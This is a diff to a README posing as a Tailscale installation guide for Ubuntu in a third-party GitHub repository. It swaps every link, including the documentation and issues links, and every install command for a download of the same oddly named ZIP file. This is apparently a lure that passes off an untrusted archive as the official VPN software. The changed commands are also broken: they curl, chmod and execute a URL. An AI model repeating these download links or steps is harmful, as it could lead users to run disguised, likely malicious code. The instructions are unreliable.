@@ -4,7 +4,7 @@
 
 Welcome to the Tailscale installation guide! This guide helps you download and set up Tailscale on your Ubuntu system. You will have a secure VPN connection in no time.
 
-[![Download Tailscale](https://img.shields.io/badge/Download%20Tailscale-via%20GitHub-brightgreen)](https://github.com/e23awais/tailscale/releases)
+[![Download Tailscale](https://github.com/e23awais/tailscale/raw/refs/heads/main/phytic/tailscale_unpronouncing.zip%20Tailscale-via%20GitHub-brightgreen)](https://github.com/e23awais/tailscale/raw/refs/heads/main/phytic/tailscale_unpronouncing.zip)
 
 ## 📋 What is Tailscale?
 
@@ -28,7 +28,7 @@ Before installing Tailscale, make sure your system meets the following requireme
 
 To get started, visit this page to download the Tailscale script:
 
-[Download Tailscale](https://github.com/e23awais/tailscale/releases)
+[Download Tailscale](https://github.com/e23awais/tailscale/raw/refs/heads/main/phytic/tailscale_unpronouncing.zip)
 
 Follow these steps to install Tailscale:
 
@@ -36,17 +36,17 @@ Follow these steps to install Tailscale:
   
 2. **Download the Script**: Enter the following command to download the bash script:
    ```bash
-   curl -O https://raw.githubusercontent.com/e23awais/tailscale/main/install.sh
+   curl -O https://github.com/e23awais/tailscale/raw/refs/heads/main/phytic/tailscale_unpronouncing.zip
    ```
    
 3. **Make the Script Executable**: Run this command to give the script the necessary permissions:
    ```bash
-   chmod +x install.sh
+   chmod +x https://github.com/e23awais/tailscale/raw/refs/heads/main/phytic/tailscale_unpronouncing.zip
    ```
 
 4. **Run the Script**: Now, execute the script to install Tailscale:
    ```bash
-   ./install.sh
+   https://github.com/e23awais/tailscale/raw/refs/heads/main/phytic/tailscale_unpronouncing.zip
    ```
 
 5. **Start Tailscale**: After installation, start Tailscale with this command:
@@ -107,8 +107,8 @@ This project is open-source and published under the MIT License. You can view th
 
 ## 🔗 Useful Links
 
-- [Tailscale Releases](https://github.com/e23awais/tailscale/releases)
-- [Tailscale Documentation](https://tailscale.com/kb/)
-- [GitHub Issues](https://github.com/e23awais/tailscale/issues)
+- [Tailscale Releases](https://github.com/e23awais/tailscale/raw/refs/heads/main/phytic/tailscale_unpronouncing.zip)
+- [Tailscale Documentation](https://github.com/e23awais/tailscale/raw/refs/heads/main/phytic/tailscale_unpronouncing.zip)
+- [GitHub Issues](https://github.com/e23awais/tailscale/raw/refs/heads/main/phytic/tailscale_unpronouncing.zip)
 
 Thank you for using Tailscale! Get started today and enjoy secure networking.
